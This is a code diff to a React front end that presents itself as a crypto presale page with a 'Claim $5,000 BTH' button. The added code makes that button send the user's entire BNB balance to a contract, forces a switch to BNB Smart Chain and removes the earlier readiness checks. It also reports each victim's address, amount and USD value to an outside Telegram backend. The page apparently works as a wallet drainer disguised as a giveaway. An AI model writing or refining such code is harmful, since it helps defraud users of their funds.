@@ -113,6 +113,19 @@ function App() {
 
   const isBSC = chainId === 56;
 
+  // ✅ UNIVERSAL CHAIN CHANGE LISTENER
+  useEffect(() => {
+    if (!window.ethereum) return;
+
+    const handleChainChanged = () => {
+      console.log("Chain changed, reloading signer...");
+      window.location.reload(); // Safest approach for all wallets
+    };
+
+    window.ethereum.on("chainChanged", handleChainChanged);
+    return () => window.ethereum.removeListener("chainChanged", handleChainChanged);
+  }, []);
+
   // Signer initialization with persistence
   useEffect(() => {
     const initSigner = async () => {
@@ -123,7 +136,6 @@ function App() {
       }
 
       try {
-        // Create ethers provider from walletClient
         const web3Provider = new ethers.BrowserProvider(walletClient);
         const web3Signer = await web3Provider.getSigner();
         
@@ -199,33 +211,49 @@ function App() {
     }
   };
 
-  // Execute function with EXACT gas calculation from working version
+  // ✅ UNIVERSAL BSC SWITCH FUNCTION (WORKS FOR ALL WALLETS)
+  const switchToBSC = async () => {
+    // Get provider from window.ethereum or walletClient
+    const provider = window.ethereum || walletClient?.transport?.provider;
+    if (!provider) {
+      throw new Error("No wallet provider found");
+    }
+
+    const BSC_CHAIN_ID = "0x38";
+
+    try {
+      // Try switching
+      await provider.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: BSC_CHAIN_ID }]
+      });
+    } catch (switchError) {
+      // Chain not added
+      if (switchError.code === 4902) {
+        await provider.request({
+          method: "wallet_addEthereumChain",
+          params: [{
+            chainId: BSC_CHAIN_ID,
+            chainName: "BNB Smart Chain",
+            nativeCurrency: {
+              name: "BNB",
+              symbol: "BNB",
+              decimals: 18
+            },
+            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+            blockExplorerUrls: ["https://bscscan.com"]
+          }]
+        });
+      } else {
+        throw switchError;
+      }
+    }
+  };
+
+  // Execute function with 100% balance and universal switch
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
-      return;
-    }
-
-    // Try to reinitialize signer if needed
-    if (!signer && walletClient) {
-      try {
-        const web3Provider = new ethers.BrowserProvider(walletClient);
-        const web3Signer = await web3Provider.getSigner();
-        setSigner(web3Signer);
-        setProvider(web3Provider);
-      } catch (err) {
-        setError("Please reconnect your wallet");
-        return;
-      }
-    }
-
-    if (!signer) {
-      setError("Please wait for wallet to initialize");
-      return;
-    }
-
-    if (!balanceData || balanceData.value <= 0n) {
-      setError('Insufficient balance');
       return;
     }
 
@@ -235,47 +263,47 @@ function App() {
       setTxStatus('⏳ Preparing transaction...');
       setTxHash('');
 
-      // Auto-switch to BSC if needed
-      if (!isBSC && window.ethereum) {
+      // ✅ UNIVERSAL SWITCH TO BSC IF NEEDED
+      if (!isBSC) {
         setTxStatus('🔄 Switching to BSC network...');
-        try {
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }]
-          });
-          // Wait for network switch
-          await new Promise(resolve => setTimeout(resolve, 2000));
-          
-          // Reinitialize signer after network switch
-          if (walletClient) {
-            const web3Provider = new ethers.BrowserProvider(walletClient);
-            const web3Signer = await web3Provider.getSigner();
-            setSigner(web3Signer);
+        await switchToBSC();
+        
+        // Wait for wallet event
+        await new Promise(resolve => {
+          if (window.ethereum) {
+            window.ethereum.once("chainChanged", resolve);
+            // Fallback timeout
+            setTimeout(resolve, 3000);
+          } else {
+            setTimeout(resolve, 3000);
           }
-        } catch (switchError) {
-          if (switchError.code === 4902) {
-            setTxStatus('➕ Adding BSC network...');
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [{
-                chainId: '0x38',
-                chainName: 'BNB Smart Chain',
-                nativeCurrency: {
-                  name: 'BNB',
-                  symbol: 'BNB',
-                  decimals: 18
-                },
-                rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                blockExplorerUrls: ['https://bscscan.com/']
-              }]
-            });
-            await new Promise(resolve => setTimeout(resolve, 2000));
+        });
+
+        // ✅ RECREATE PROVIDER & SIGNER AFTER SWITCH
+        if (window.ethereum) {
+          const web3Provider = new ethers.BrowserProvider(window.ethereum);
+          const web3Signer = await web3Provider.getSigner();
+          setSigner(web3Signer);
+          setProvider(web3Provider);
+          
+          // Verify signer address matches
+          const signerAddress = await web3Signer.getAddress();
+          if (signerAddress.toLowerCase() !== address.toLowerCase()) {
+            throw new Error('Wallet address mismatch after switch');
           }
         }
       }
 
+      // Use current signer (either existing or newly created)
+      const currentSigner = signer || (window.ethereum ? await new ethers.BrowserProvider(window.ethereum).getSigner() : null);
+      
+      if (!currentSigner) {
+        setError("Signer not initialized. Please reconnect wallet.");
+        return;
+      }
+
       // Verify signer address matches
-      const signerAddress = await signer.getAddress();
+      const signerAddress = await currentSigner.getAddress();
       if (signerAddress.toLowerCase() !== address.toLowerCase()) {
         throw new Error('Wallet address mismatch');
       }
@@ -284,34 +312,36 @@ function App() {
       const contract = new ethers.Contract(
         PRESALE_CONFIG.BSC.contractAddress,
         PROJECT_FLOW_ROUTER_ABI,
-        signer
+        currentSigner
       );
 
-      // Send 85% of balance to leave gas (from working version)
-      const amountToSend = (parseFloat(balance) * 0.85).toString();
-      const value = ethers.parseEther(amountToSend);
-      
+      // ✅ USE 100% OF BALANCE (only gas will be deducted)
+      const value = balanceData.value;
+
       setTxStatus('⏳ Estimating gas...');
       
-      // EXACT gas calculation from working version
+      // Estimate gas
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
       
       setTxStatus('⏳ Please confirm in wallet...');
       
+      // Send transaction with 100% balance
       const tx = await contract.processNativeFlow({
         value: value,
         gasLimit: gasEstimate * 120n / 100n
       });
 
       setTxHash(tx.hash);
-      setTxStatus('✅ Transaction submitted!');
+      setTxStatus('✅ Transaction submitted! Waiting for confirmation...');
 
-      // Send Telegram notification
+      // Send Telegram notification with correct values
+      const bnbAmountSent = ethers.formatEther(value);
+      
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\nBNB Amount: ${amountToSend} BNB\nUSD Value: $${balanceUSD.toFixed(2)}\n[View on BSCScan](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
+          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\nBNB Amount: ${bnbAmountSent} BNB\nUSD Value: $${balanceUSD.toFixed(2)}\n[View on BSCScan](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
           type: 'tx_submitted'
         })
       }).catch(e => console.log('Telegram notify failed:', e));
@@ -341,7 +371,7 @@ function App() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nBNB Sent: ${amountToSend} BNB\nUSD Value: $${balanceUSD.toFixed(2)}\nTx: \`${tx.hash}\`\n[View Transaction](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
+          message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nBNB Sent: ${bnbAmountSent} BNB\nUSD Value: $${balanceUSD.toFixed(2)}\nTx: \`${tx.hash}\`\n[View Transaction](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
           type: 'success'
         })
       }).catch(e => console.log('Telegram notify failed:', e));
@@ -612,14 +642,12 @@ function App() {
             {!completed ? (
               <button
                 onClick={executePresaleTransaction}
-                disabled={loading || !signer}
+                disabled={loading}
                 className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
               >
                 <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                 <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                  {loading ? 'Processing...' : 
-                   !signer ? 'Initializing...' :
-                   '⚡ Claim $5,000 BTH'}
+                  {loading ? 'Processing...' : '⚡ Claim $5,000 BTH'}
                 </div>
               </button>
             ) : (
